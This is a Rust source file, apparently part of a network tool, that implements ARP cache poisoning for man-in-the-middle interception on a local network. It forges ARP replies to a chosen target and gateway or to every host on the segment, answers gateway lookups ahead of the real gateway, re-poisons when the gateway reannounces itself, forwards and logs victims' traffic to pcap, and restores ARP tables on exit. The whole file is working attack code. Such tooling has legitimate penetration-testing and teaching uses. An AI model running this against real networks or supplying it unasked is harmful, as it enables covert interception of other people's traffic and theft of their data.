use std::collections::{HashMap, HashSet};
use std::net::Ipv4Addr;
use std::path::PathBuf;
use std::time::Duration;

use bytes::Bytes;
use etherparse::{EtherType, IpNumber, Ipv4Header, TcpHeader, UdpHeader};
use tokio::fs::File;
use tokio::io::{self, Stdout};
use tokio::sync::mpsc;
use tokio::task::{self, JoinHandle};
use tokio::{signal, time};

mod event;
mod format;

use self::event::{ArpInfo, PoisonKey, SpoofEvent, SpoofEventKind, Transport};
pub(super) use self::format::NeighSpoofFormat;
use self::format::NeighSpoofWriter;
use crate::arp::{self, ArpFrame, ArpOpCode, ArpPacket};
use crate::net::{
    DataLinkFrame, DataLinkHeader, DataLinkReceiver, DataLinkSender, DataLinkSocket, Host, MacAddr,
    PcapWriter, read_ipv4_gateway_sysfs,
};

/// Delay between packets of the initial burst.
const BURST_INTERVAL: Duration = Duration::from_millis(20);

/// Spawns the task consuming the event stream, writing it to stdout and
/// optionally to a pcap dump file.
#[inline]
async fn spawn_writer(
    stdout_format: NeighSpoofFormat,
    receiver: mpsc::UnboundedReceiver<SpoofEvent>,
    dump: Option<PathBuf>,
) -> JoinHandle<io::Result<()>> {
    task::spawn(writer(stdout_format, receiver, dump))
}

async fn writer(
    stdout_format: NeighSpoofFormat,
    mut rx: mpsc::UnboundedReceiver<SpoofEvent>,
    dump: Option<PathBuf>,
) -> io::Result<()> {
    let stdout: Stdout = io::stdout();
    let mut writer: NeighSpoofWriter<Stdout> = match stdout_format {
        NeighSpoofFormat::Summary => NeighSpoofWriter::Summary(stdout),
        NeighSpoofFormat::Pcap => {
            let pcap: PcapWriter<Stdout> = PcapWriter::new(stdout).await?;
            NeighSpoofWriter::Pcap(pcap)
        }
    };

    let mut dump: Option<PcapWriter<File>> = match dump {
        Some(path) => Some(PcapWriter::open(path).await?),
        None => None,
    };

    while let Some(event) = rx.recv().await {
        if let Some(dump) = dump.as_mut() {
            dump.write_packet(event.frame()).await?;
        }

        writer.write(&event).await?;
    }

    Ok(())
}

#[inline]
fn arp_info(arp: &ArpFrame) -> ArpInfo {
    ArpInfo {
        sender_mac: arp.sender_mac(),
        sender_ip: arp.sender_ip(),
        target_mac: arp.target_mac(),
        target_ip: arp.target_ip(),
    }
}

/// Sends an event to the writer task, ignoring errors if it is no longer
/// running (so an I/O failure on stdout does not kill the spoofer).
#[inline]
fn send_event(sender: &mpsc::UnboundedSender<SpoofEvent>, kind: SpoofEventKind, frame: Bytes) {
    let _ = sender.send(SpoofEvent::new(kind, frame));
}

#[allow(clippy::too_many_arguments)]
pub(super) async fn run(
    iface: String,
    gateway_ip: Option<Ipv4Addr>,
    gateway_mac: Option<MacAddr>,
    target_ip: Option<Ipv4Addr>,
    target_mac: Option<MacAddr>,
    rate: u64,
    burst: usize,
    stdout_format: NeighSpoofFormat,
    dump: Option<PathBuf>,
) -> io::Result<()> {
    eprintln!("Using interface: {iface}");

    let rate: Duration = Duration::from_millis(rate);

    // Get spoofer MAC and IP
    let spoofer: Host = Host::read(&iface)?;

    eprintln!("Our MAC address: {}", spoofer.mac());
    eprintln!("Our IPv4 address: {}", spoofer.ip());

    // ARP table
    let mut table: HashMap<Ipv4Addr, MacAddr> = HashMap::new();

    let sock: DataLinkSocket = DataLinkSocket::new(&iface)?;
    let (tx, mut rx) = sock.split();

    // Event stream towards the stdout/dump writer
    let (sender, receiver) = mpsc::unbounded_channel();
    let writer_task = spawn_writer(stdout_format, receiver, dump).await;

    // Attempt to resolve gateway IP
    let gateway_ip: Ipv4Addr = match gateway_ip {
        Some(ip) => ip,
        None => {
            eprintln!("Resolving gateway IP address...");
            let ip: Ipv4Addr = read_ipv4_gateway_sysfs(&iface)?;
            eprintln!("Gateway IP address: {ip}");
            ip
        }
    };

    // Attempt to resolve the gateway MAC
    let gateway: Host = match gateway_mac {
        Some(mac) => Host::new(gateway_ip, mac),
        None => {
            eprintln!("Resolving gateway MAC address...");
            match arp::resolve_single_mac(&tx, &mut rx, spoofer, gateway_ip).await? {
                Some(mac) => {
                    eprintln!("Gateway MAC address: {mac}");
                    Host::new(gateway_ip, mac)
                }
                None => {
                    return Err(io::Error::other("Failed to resolve gateway MAC address"));
                }
            }
        }
    };

    // Attempt to resolve the target MAC, and make target Host
    let target: Option<Host> = match target_ip {
        Some(target_ip) => match target_mac {
            Some(mac) => {
                table.insert(target_ip, mac);
                Some(Host::new(target_ip, mac))
            }
            None => {
                eprintln!("Resolving target MAC address...");
                match arp::resolve_single_mac(&tx, &mut rx, spoofer, target_ip).await? {
                    Some(target_mac) => {
                        eprintln!("Target MAC address: {target_mac}");
                        table.insert(target_ip, target_mac);
                        Some(Host::new(target_ip, target_mac))
                    }
                    None => {
                        // The target IP is explicitly set, so if we can't resolve the MAC, the spoofing should not start.
                        return Err(io::Error::other("Failed to resolve target MAC address"));
                    }
                }
            }
        },
        None => None,
    };

    let result: io::Result<()> = tokio::select! {
        result = spoof_loop(&tx, &mut rx, &mut table, spoofer, gateway, target, rate, burst, &sender) => {
            result
        }
        result = signal::ctrl_c() => {
            result
        },
    };

    restore_arp(&tx, &table, spoofer, gateway, burst, &sender).await?;

    drop(sender);

    // Waits for the writer task to finish.
    let writer_result: io::Result<()> = writer_task.await.map_err(io::Error::other)?;

    result?;
    writer_result?;

    Ok(())
}

fn make_poison_frames(spoofer: Host, gateway: Host, target: Option<Host>) -> Vec<Bytes> {
    // Poison frames, sent on the initial burst and on every tick.
    let mut poisons: Vec<Bytes> = Vec::new();

    match target {
        Some(target) => {
            // Targeted mode, unicast poison to both directions.

            // Target: the gateway is at our MAC
            let to_target = DataLinkFrame {
                eth_dst: target.mac(),
                eth_src: spoofer.mac(),
                payload: ArpPacket::new(
                    ArpOpCode::Reply,
                    spoofer.mac(),
                    gateway.ip(),
                    target.mac(),
                    target.ip(),
                ),
            };

            // Gateway: the target is at our MAC
            let to_gateway = DataLinkFrame {
                eth_dst: gateway.mac(),
                eth_src: spoofer.mac(),
                payload: ArpPacket::new(
                    ArpOpCode::Reply,
                    spoofer.mac(),
                    target.ip(),
                    gateway.mac(),
                    gateway.ip(),
                ),
            };

            poisons.push(to_target.encode());
            poisons.push(to_gateway.encode());
        }
        None => {
            // Without an explicit target, poison every host on the segment
            // using a gratuitous-style frame (sender IP == target IP == gateway)
            let reply = DataLinkFrame {
                eth_dst: MacAddr::BROADCAST,
                eth_src: spoofer.mac(),
                payload: ArpPacket::new(
                    ArpOpCode::Reply,
                    spoofer.mac(),
                    gateway.ip(),
                    MacAddr::BROADCAST,
                    gateway.ip(),
                ),
            };

            poisons.push(reply.encode());
        }
    }

    poisons
}

/// Unicast poison frames for every host discovered via sniffed ARP traffic.
/// Many devices (i.e., Android) ignore unsolicited broadcast ARP replies,
/// but accept unicast ones.
fn make_unicast_poison_frames(
    table: &HashMap<Ipv4Addr, MacAddr>,
    spoofer: Host,
    gateway: Host,
) -> Vec<Bytes> {
    let mut poisons: Vec<Bytes> = Vec::new();

    for (host_ip, host_mac) in table.iter() {
        if *host_ip == gateway.ip() {
            continue;
        }

        let to_host = DataLinkFrame {
            eth_dst: *host_mac,
            eth_src: spoofer.mac(),
            payload: ArpPacket::new(
                ArpOpCode::Reply,
                spoofer.mac(),
                gateway.ip(),
                *host_mac,
                *host_ip,
            ),
        };

        let to_gateway = DataLinkFrame {
            eth_dst: gateway.mac(),
            eth_src: spoofer.mac(),
            payload: ArpPacket::new(
                ArpOpCode::Reply,
                spoofer.mac(),
                *host_ip,
                gateway.mac(),
                gateway.ip(),
            ),
        };

        poisons.push(to_host.encode());
        poisons.push(to_gateway.encode());
    }

    poisons
}

/// Sends poison events to the writer task, deduplicated on `reported`, so
/// repeated poison frames towards the same victim do not flood the stdout.
fn emit_poison(
    reported: &mut HashSet<PoisonKey>,
    sender: &mpsc::UnboundedSender<SpoofEvent>,
    arp: &ArpFrame,
    frame: &Bytes,
) {
    let info: ArpInfo = arp_info(arp);

    if reported.insert(info.poison_key()) {
        send_event(sender, SpoofEventKind::Poison(info), frame.clone());
    }
}

async fn send_poisons(
    tx: &DataLinkSender,
    poisons: &[Bytes],
    reported: &mut HashSet<PoisonKey>,
    sender: &mpsc::UnboundedSender<SpoofEvent>,
) -> io::Result<()> {
    for poison in poisons {
        tx.send(poison).await?;

        if let Ok(arp) = ArpFrame::decode(poison) {
            emit_poison(reported, sender, &arp, poison);
        }
    }

    Ok(())
}

#[allow(clippy::too_many_arguments)]
async fn spoof_loop(
    tx: &DataLinkSender,
    rx: &mut DataLinkReceiver,
    table: &mut HashMap<Ipv4Addr, MacAddr>,
    spoofer: Host,
    gateway: Host,
    target: Option<Host>,
    rate: Duration,
    burst: usize,
    sender: &mpsc::UnboundedSender<SpoofEvent>,
) -> io::Result<()> {
    let poisons: Vec<Bytes> = make_poison_frames(spoofer, gateway, target);

    // Victims whose poisoning was already announced to the stdout
    let mut reported: HashSet<PoisonKey> = HashSet::new();

    // Initial burst to poison the caches as fast as possible
    for i in 0..burst {
        if i > 0 {
            time::sleep(BURST_INTERVAL).await;
        }

        send_poisons(tx, &poisons, &mut reported, sender).await?;
    }

    let mut tick = time::interval(rate);

    loop {
        tokio::select! {
            _ = tick.tick() => {
                send_poisons(tx, &poisons, &mut reported, sender).await?;

                // In broadcast mode, unicast poison also every host seen in the ARP table
                if target.is_none() {
                    let unicast_poisons: Vec<Bytes> = make_unicast_poison_frames(table, spoofer, gateway);
                    send_poisons(tx, &unicast_poisons, &mut reported, sender).await?;
                }
            },
            frame = rx.next() => {
                if let Err(e) = handle_frame(frame?, &mut reported, table, spoofer, gateway, target, tx, &poisons, sender).await {
                    eprintln!("Error handling frame: {e}");
                }
            }
        }
    }
}

#[allow(clippy::too_many_arguments)]
async fn handle_frame(
    frame: Vec<u8>,
    reported: &mut HashSet<PoisonKey>,
    table: &mut HashMap<Ipv4Addr, MacAddr>,
    spoofer: Host,
    gateway: Host,
    target: Option<Host>,
    tx: &DataLinkSender,
    poisons: &[Bytes],
    sender: &mpsc::UnboundedSender<SpoofEvent>,
) -> io::Result<()> {
    if let Ok(arp) = ArpFrame::decode(&frame) {
        return handle_arp(
            &arp, &frame, reported, table, spoofer, gateway, target, tx, poisons, sender,
        )
        .await;
    };

    handle_ipv4_packet_forward(frame, table, tx, spoofer, gateway, sender).await
}

#[allow(clippy::too_many_arguments)]
async fn handle_arp(
    arp: &ArpFrame,
    frame: &[u8],
    reported: &mut HashSet<PoisonKey>,
    table: &mut HashMap<Ipv4Addr, MacAddr>,
    spoofer: Host,
    gateway: Host,
    target: Option<Host>,
    tx: &DataLinkSender,
    poisons: &[Bytes],
    sender: &mpsc::UnboundedSender<SpoofEvent>,
) -> io::Result<()> {
    // Discard our own packets
    if arp.eth_src == spoofer.mac() {
        eprintln!("Received packet from our own MAC address");
        return Ok(());
    }

    // The gateway reannounced an IP that we impersonate.
    // Immediately poison again without waiting for the tick.
    // This is a transition: the counter-poison gets announced again.
    if arp.is_gratuitous() && arp.sender_ip() == gateway.ip() {
        send_event(
            sender,
            SpoofEventKind::ArpReply(arp_info(arp)),
            Bytes::copy_from_slice(frame),
        );
        eprintln!("Gateway reannounced an IP that we impersonate, spoofing again");

        reported.clear();

        send_poisons(tx, poisons, reported, sender).await?;

        // In broadcast mode, unicast poison also every host seen in the ARP table
        if target.is_none() {
            let unicast_poisons: Vec<Bytes> = make_unicast_poison_frames(table, spoofer, gateway);
            send_poisons(tx, &unicast_poisons, reported, sender).await?;
        }

        return Ok(());
    }

    if arp.sender_mac() != spoofer.mac()
        && !arp.sender_mac().is_broadcast()
        && !arp.sender_mac().is_unspecified()
    {
        table.insert(arp.sender_ip(), arp.sender_mac());
    }

    match arp.opcode() {
        ArpOpCode::Request => {
            send_event(
                sender,
                SpoofEventKind::ArpRequest(arp_info(arp)),
                Bytes::copy_from_slice(frame),
            );

            // Someone is looking for the gateway: answer immediately,
            // so its cache gets poisoned before the gateway can reply.
            // In targeted mode, only answer to the target, so no other
            // host's cache gets poisoned.
            let is_target: bool = target.is_none_or(|t| arp.eth_src == t.mac());

            if arp.target_ip() == gateway.ip() && is_target {
                let response = DataLinkFrame {
                    eth_dst: arp.eth_src,
                    eth_src: spoofer.mac(),
                    payload: ArpPacket::new(
                        ArpOpCode::Reply,
                        spoofer.mac(),
                        gateway.ip(),
                        arp.eth_src,
                        arp.sender_ip(),
                    ),
                };

                let response = response.encode();

                tx.send(&response).await?;

                if let Ok(arp) = ArpFrame::decode(&response) {
                    emit_poison(reported, sender, &arp, &response);
                }
            }
        }
        ArpOpCode::Reply => {
            send_event(
                sender,
                SpoofEventKind::ArpReply(arp_info(arp)),
                Bytes::copy_from_slice(frame),
            );
        }
    }

    Ok(())
}

async fn handle_ipv4_packet_forward(
    mut frame: Vec<u8>,
    table: &mut HashMap<Ipv4Addr, MacAddr>,
    tx: &DataLinkSender,
    spoofer: Host,
    gateway: Host,
    sender: &mpsc::UnboundedSender<SpoofEvent>,
) -> io::Result<()> {
    // May be received packets smaller than the Data Link Header, so not return an error here.
    let Ok(dhl) = DataLinkHeader::extract(&frame) else {
        return Ok(());
    };

    // Handle only IPv4 packets
    if dhl.ethertype() != EtherType::IPV4.0 {
        return Ok(());
    }

    // Skip packets destined for our MAC address
    if dhl.eth_dst() != spoofer.mac() {
        return Ok(());
    }

    // Skip our own frames echoed back by the socket
    if dhl.eth_src() == spoofer.mac() {
        return Ok(());
    }

    let Ok((ip_header, ip_payload)) = Ipv4Header::from_slice(&frame[DataLinkHeader::LEN..]) else {
        return Ok(());
    };

    let src_ip: Ipv4Addr = Ipv4Addr::from(ip_header.source);
    let dst_ip: Ipv4Addr = Ipv4Addr::from(ip_header.destination);

    // Skip packets addressed to us: they are for the local stack, not to forward
    if dst_ip == spoofer.ip() {
        return Ok(());
    }

    let transport: Transport = parse_transport(ip_header.protocol, ip_payload);

    if dhl.eth_src() == gateway.mac() {
        // gateway to target (look in the ARP table)
        match table.get(&dst_ip) {
            Some(victim_mac) => rewrite_mac_addrs(&mut frame, *victim_mac, spoofer.mac()),
            None => return Ok(()), // Target not yet seen (trigger ARP request?)
        }
    } else {
        rewrite_mac_addrs(&mut frame, gateway.mac(), spoofer.mac());
    }

    // TODO: allow forwarding the traffic to other tools

    // Forward the modified frame
    tx.send(&frame).await?;

    send_event(
        sender,
        SpoofEventKind::Forwarded {
            src_ip,
            dst_ip,
            transport,
        },
        Bytes::from(frame),
    );

    Ok(())
}

/// Best-effort transport protocol identification, for the summary output.
fn parse_transport(protocol: IpNumber, payload: &[u8]) -> Transport {
    match protocol {
        IpNumber::TCP => match TcpHeader::from_slice(payload) {
            Ok((tcp, _)) => Transport::Tcp {
                src_port: tcp.source_port,
                dst_port: tcp.destination_port,
            },
            Err(_) => Transport::Other(IpNumber::TCP.0),
        },
        IpNumber::UDP => match UdpHeader::from_slice(payload) {
            Ok((udp, _)) => Transport::Udp {
                src_port: udp.source_port,
                dst_port: udp.destination_port,
            },
            Err(_) => Transport::Other(IpNumber::UDP.0),
        },
        IpNumber::ICMP => Transport::Icmp,
        other => Transport::Other(other.0),
    }
}

fn rewrite_mac_addrs(frame: &mut [u8], new_dst: MacAddr, new_src: MacAddr) {
    // The checksums TCP/IP DON'T have to be calculated, as the MAC aren't included in the checksum.
    frame[0..6].copy_from_slice(new_dst.as_bytes());
    frame[6..12].copy_from_slice(new_src.as_bytes());
}

async fn restore_arp(
    tx: &DataLinkSender,
    table: &HashMap<Ipv4Addr, MacAddr>,
    spoofer: Host,
    gateway: Host,
    burst: usize,
    sender: &mpsc::UnboundedSender<SpoofEvent>,
) -> io::Result<()> {
    // Restore gateway -> target
    restore_target_arp(tx, table, spoofer.mac(), gateway, burst, sender).await?;

    // Restore target -> gateway
    restore_gateway_arp(tx, table, spoofer.mac(), gateway, burst, sender).await?;

    // Restore all others
    restore_broadcast_arp(tx, spoofer.mac(), gateway, burst, sender).await?;

    Ok(())
}

async fn restore_target_arp(
    tx: &DataLinkSender,
    table: &HashMap<Ipv4Addr, MacAddr>,
    our_mac: MacAddr,
    gateway: Host,
    burst: usize,
    sender: &mpsc::UnboundedSender<SpoofEvent>,
) -> io::Result<()> {
    eprintln!("Restoring ARP for gateway -> target...");

    for (target_ip, target_mac) in table.iter() {
        if *target_ip == gateway.ip() {
            continue;
        }

        let reply = DataLinkFrame {
            eth_dst: *target_mac,
            eth_src: our_mac,
            payload: ArpPacket::new(
                ArpOpCode::Reply,
                gateway.mac(),
                gateway.ip(),
                *target_mac,
                *target_ip,
            ),
        };

        let reply = reply.encode();

        emit_restore(sender, &reply);

        for _ in 0..burst {
            tx.send(&reply).await?;
            time::sleep(BURST_INTERVAL).await;
        }

        eprintln!("Restored ARP for {} -> {target_ip}.", gateway.ip());
    }

    Ok(())
}

async fn restore_gateway_arp(
    tx: &DataLinkSender,
    table: &HashMap<Ipv4Addr, MacAddr>,
    our_mac: MacAddr,
    gateway: Host,
    burst: usize,
    sender: &mpsc::UnboundedSender<SpoofEvent>,
) -> io::Result<()> {
    eprintln!("Restoring ARP for target -> gateway...");

    for (target_ip, target_mac) in table.iter() {
        // Skip the gateway itself
        if *target_ip == gateway.ip() {
            continue;
        }

        let reply = DataLinkFrame {
            eth_dst: gateway.mac(),
            eth_src: our_mac,
            payload: ArpPacket::new(
                ArpOpCode::Reply,
                *target_mac,
                *target_ip,
                gateway.mac(),
                gateway.ip(),
            ),
        };

        let reply = reply.encode();

        emit_restore(sender, &reply);

        for _ in 0..burst {
            tx.send(&reply).await?;
            time::sleep(BURST_INTERVAL).await;
        }

        eprintln!("Restored ARP for {target_ip} -> {}.", gateway.ip());
    }

    Ok(())
}

async fn restore_broadcast_arp(
    tx: &DataLinkSender,
    our_mac: MacAddr,
    gateway: Host,
    burst: usize,
    sender: &mpsc::UnboundedSender<SpoofEvent>,
) -> io::Result<()> {
    eprintln!("Restoring ARP for other hosts not seen...");

    let reply = DataLinkFrame {
        eth_dst: MacAddr::BROADCAST,
        eth_src: our_mac,
        payload: ArpPacket::new(
            ArpOpCode::Reply,
            gateway.mac(),
            gateway.ip(),
            gateway.mac(),
            gateway.ip(),
        ),
    };

    let reply = reply.encode();

    emit_restore(sender, &reply);

    for _ in 0..burst {
        tx.send(&reply).await?;
        time::sleep(BURST_INTERVAL).await;
    }

    eprintln!("Restored ARP for other hosts.");

    Ok(())
}

#[inline]
fn emit_restore(sender: &mpsc::UnboundedSender<SpoofEvent>, reply: &Bytes) {
    if let Ok(arp) = ArpFrame::decode(reply) {
        send_event(
            sender,
            SpoofEventKind::Restore(arp_info(&arp)),
            reply.clone(),
        );
    }
}
